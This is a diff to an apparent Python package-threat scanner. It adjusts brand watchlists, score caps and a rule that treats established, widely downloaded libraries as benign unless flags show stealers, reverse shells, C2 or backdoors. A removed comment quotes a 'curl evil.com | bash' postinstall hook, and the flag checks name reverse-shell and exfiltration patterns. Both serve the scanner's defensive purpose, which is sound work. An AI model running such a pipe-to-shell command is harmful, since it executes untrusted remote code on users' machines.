@@ -36,15 +36,15 @@ HIGH_VALUE_BRANDS: Set[str] = {
     "coinbase", "kraken", "okx", "bybit", "kucoin", "bitfinex", "crypto-com", "cryptocom",
     "gemini", "gateio", "deribit", "bitget", "mexc", "robinhood", "bitstamp",
     "ledger", "trezor", "phantom", "trustwallet", "exodus", "keplr", "rabby",
-    "rainbow", "safe", "gnosis-safe", "argent", "zerion", "walletconnect",
+    "rainbow", "gnosis-safe", "safe-global", "gnosis-safe", "argent", "zerion", "walletconnect",
     "web3", "ethers", "ethersproject", "viem", "wagmi", "foundry", "hardhat",
     "alchemy", "infura", "quicknode", "moralis", "thegraph", "graphprotocol",
     "chainlink", "pyth", "wormhole", "layerzero", "axelar",
-    "polygon", "matic", "arbitrum", "optimism", "base", "zksync", "starknet",
+    "polygon", "matic", "arbitrum", "optimism", "coinbase-base", "base-org", "zksync", "starknet",
     "scroll", "linea", "mantle", "berachain", "celestia", "sei", "injective",
-    "avalanche", "avax", "cardano", "ada", "polkadot", "dot", "cosmos", "atom",
-    "near", "aptos", "sui", "ton", "toncoin", "ripple", "xrp", "tron", "trx", "monero", "xmr",
-    "uniswap", "aave", "compound", "curve", "curvefi", "makerdao", "maker", "lido",
+    "avalanche", "avax", "cardano", "ada", "polkadot",  "cosmos", "cosmos-atom",
+    "near", "aptos", "sui",  "toncoin", "ripple", "xrp", "tron", "trx", "monero", "xmr",
+    "uniswap", "aave", "compound",  "curvefi", "makerdao",  "lido",
     "pancakeswap", "sushiswap", "balancer", "synthetix", "dydx", "1inch", "yearn",
     "gmx", "jupiter", "raydium", "hyperliquid", "morpho", "eigenlayer", "ethena", "pendle",
     "opensea", "blur", "magic-eden", "tether", "usdt", "circle", "usdc", "paxos",
@@ -66,7 +66,7 @@ HIGH_VALUE_BRANDS: Set[str] = {
     "sentinelone", "crowdstrike", "paloaltonetworks", "fortinet", "checkpoint",
     "cisco", "trendmicro", "sophos", "mcafee", "symantec", "rapid7", "tenable",
     "qualys", "snyk", "datadog", "pagerduty", "twilio", "segment", "onepassword",
-    "lastpass", "bitwarden", "hashicorp", "vault", "cyberark", "wiz", "netskope",
+    "lastpass", "bitwarden", "hashicorp", "hashicorp-vault", "cyberark", "wiz", "netskope",
     "zscaler", "sailpoint", "splunk", "pingidentity", "onelogin", "jfrog",
     "sonarqube", "sonarsource", "veracode", "checkmarx",
 }
@@ -854,7 +854,7 @@ class ProgressiveThreatEvaluator:
                         severity="MEDIUM",
                         score_impact=15,
                         rule_code="RULE_RAPID_SEMVER_BURST",
-                        human_description=f"Package published {meta.release_count} versions in rapid succession (< 24h) to mimic mature open source maintenance.",
+                        human_description="Package published 5+ versions in rapid succession (< 24h) to mimic mature open source maintenance.",
                         metadata={"release_count": meta.release_count},
                     )
                 )
@@ -982,18 +982,30 @@ class ProgressiveThreatEvaluator:
             has_malware_hooks = False
 
             if ast_report.flags:
+                kind_points: Dict[str, int] = {}
                 for f in ast_report.flags:
-                    # Was previously narrowed to Python-only ("SOCKET"+"INSTALL_TIME" or
-                    # "REVERSE_SHELL"), so an npm package with e.g. a "curl evil.com |
-                    # bash" postinstall script could never trigger the CRITICAL/malware
-                    # path — npm's manifest inspector emits LIFECYCLE_SCRIPT /
-                    # SUSPICIOUS_SHELL_COMMAND, neither of which matched.
                     is_stealer = "CONFIRMED_STEALER" in f
                     is_crit = f.startswith(CONFIRMED_DANGEROUS_FLAG_PREFIXES) or "REVERSE_SHELL" in f
                     is_suspicious_hook = "INSTALL_TIME" in f or "LIFECYCLE" in f
+                    flag_prefix = f.split(":")[0].strip() if ":" in f else f[:30]
+
                     pts = 85 if is_stealer else 45 if is_crit else 25 if is_suspicious_hook else 15
-                    accumulated_score += pts
-                    if is_crit:
+
+                    # Per-category score caps to prevent flooding on large, multi-file codebases
+                    curr_pts = kind_points.get(flag_prefix, 0)
+                    if flag_prefix in ("SOURCE_CODE_ENV_VARS_ACCESS", "SOURCE_CODE_DYNAMIC_EXECUTION"):
+                        allowed_pts = max(0, min(pts, 30 - curr_pts))
+                    elif flag_prefix in ("BUNDLED_NATIVE_BINARY", "SYNTAX_ERROR"):
+                        allowed_pts = max(0, min(pts, 25 - curr_pts))
+                    elif not is_crit:
+                        allowed_pts = max(0, min(pts, 45 - curr_pts))
+                    else:
+                        allowed_pts = max(0, min(pts, 90 - curr_pts))
+
+                    kind_points[flag_prefix] = curr_pts + allowed_pts
+                    accumulated_score += allowed_pts
+
+                    if is_crit and allowed_pts > 0:
                         has_malware_hooks = True
 
                     evidence_signals.append(
@@ -1001,7 +1013,7 @@ class ProgressiveThreatEvaluator:
                             signal_id="SIGNAL_WEAPONIZED_MALICIOUS_PAYLOAD" if is_crit else "SIGNAL_SUSPICIOUS_AST_PATTERN",
                             category="CODE_ANALYSIS",
                             severity="CRITICAL" if is_crit else "HIGH",
-                            score_impact=pts,
+                            score_impact=allowed_pts,
                             rule_code="RULE_AST_WEAPONIZED_EXEC" if is_crit else "RULE_AST_SUSPICIOUS_CALL",
                             human_description=f,
                             is_critical=is_crit,
@@ -1090,6 +1102,7 @@ class ProgressiveThreatEvaluator:
             daily_dl = meta.daily_downloads or 0
 
             if monthly_dl >= 100000:
+                accumulated_score = max(0, accumulated_score - 20)
                 evidence_signals.append(
                     EvidenceSignal(
                         signal_id="SIGNAL_HIGH_DOWNLOAD_MOMENTUM",
@@ -1262,6 +1275,29 @@ class ProgressiveThreatEvaluator:
 
             is_official_vendor = is_vendor_domain or (is_vendor_repo and (monthly_dl >= 1000 or ast_report.total_lines_of_code >= 200)) or (is_trusted_vendor and not has_malware_hooks and (monthly_dl >= 50 or ast_report.total_lines_of_code >= 30 or is_vendor_domain))
 
+            # High-Adoption Community & Historical Codebase Safeguard:
+            # Established libraries (high usage or mature historical existence with substantial codebase)
+            # must not be classified as MALICIOUS without confirmed stealer, reverse shell, or C2 exfiltration.
+            has_confirmed_stealer_or_c2 = (
+                any("stealer" in f.lower() for f in ast_report.flags)
+                or any("reverse_shell" in f.lower() or "reverse shell" in f.lower() for f in ast_report.flags)
+                or any("socket" in f.lower() for f in ast_report.flags)
+                or any("exfiltration" in f.lower() for f in ast_report.flags)
+                or any("c2" in f.lower() for f in ast_report.flags)
+                or any("worm" in f.lower() for f in ast_report.flags)
+                or any("backdoor" in f.lower() for f in ast_report.flags)
+                or any("evasive_payload" in f.lower() for f in ast_report.flags)
+                or any("powershell" in f.lower() for f in ast_report.flags)
+            )
+
+            is_established_community = (
+                (monthly_dl >= 10000 and days_dormant >= 180)
+                or (days_dormant >= 1000 and ast_report.total_lines_of_code >= 1000)
+            )
+
+            if is_established_community and not has_confirmed_stealer_or_c2:
+                has_malware_hooks = False
+
             # Hijack / Account takeover detection on trusted/official vendor package:
             # If weaponized malware hooks fired on a trusted vendor, DO NOT zero it out!
             if (is_official_vendor or is_trusted_vendor) and has_malware_hooks and not is_deprecated_pkg:
@@ -1285,6 +1321,9 @@ class ProgressiveThreatEvaluator:
             elif is_official_vendor:
                 verdict = ThreatVerdict.VERIFIED_OFFICIAL
                 final_score = min(20, accumulated_score)
+            elif is_established_community and not has_confirmed_stealer_or_c2:
+                verdict = ThreatVerdict.BENIGN_COMMUNITY
+                final_score = min(25, max(5, accumulated_score // 5))
             elif is_deprecated_pkg and days_dormant > 730:
                 # Pre-AI historical packages abandoned/deprecated years ago (e.g. gemini-web from 2017)
                 # are legacy projects, not active modern slopsquatting attacks.
